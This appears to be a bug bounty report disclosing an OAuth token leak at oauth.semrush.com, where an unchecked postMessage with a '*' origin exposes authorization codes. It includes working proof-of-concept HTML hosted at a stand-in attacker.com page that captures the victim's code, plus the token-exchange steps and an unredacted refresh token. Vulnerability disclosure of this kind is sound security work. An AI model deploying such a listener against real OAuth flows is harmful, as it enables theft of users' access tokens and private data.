Summary:

Domain, site, application
---
oauth.semrush.com

Steps to reproduce
---
1) Create following html at attacker.com/postmessage.html

```
<script>
  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962");
  
  window.addEventListener("message", listener);
</script>
```
2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)
3) Click "Approve"
4) Go to tab with attacker.com, you will see alert with `code`
5) Make POST request with obtained `code`
```
POST /oauth2/access_token HTTP/1.1
Host: oauth.semrush.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0

```
6) Receive response with `access token` and `refresh token`
```

Set-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly

{"access_token":"███████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

Actual results
---
`access token` and `refresh token` of victim:
```
{"access_token":"██████████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

PoC, exploit code, screenshots, video, references, additional resources
---
This vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:
```
<script>
	if (window.opener && typeof opener.postMessage === 'function') {
		opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');
	}
</script>
```
Meaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.

Attack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks "Approve".

Still working at vector without this small user interaction.

## Impact

OAuth tokens leakage. This leads to user sensitive information leakage.
**Note**: it's not necessary to install SEOquake plugin!

P.S.
---
I'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.

I've reported vulnerability as soon as possible therefore no time to deeper scope research.
